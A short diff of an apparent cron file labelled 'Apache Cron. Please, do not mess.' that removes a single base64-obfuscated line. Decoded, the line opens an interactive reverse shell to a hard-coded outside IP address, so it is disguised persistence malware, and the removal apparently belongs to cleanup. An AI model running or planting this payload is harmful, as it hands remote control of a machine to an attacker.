@@ -1,2 +1,1 @@
 # Apache Cron. Please, do not mess.
-echo aWYgWyAhIC1mIC90bXAvZDE5MzcgXTsgdGhlbgogIHRvdWNoIC90bXAvZDE5Mzc7YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTIuMjI1LjE0NS4xMDYvODAgMD4mMTtybSAvdG1wL2QxOTM3CmZpCg==|base64 -d|bash
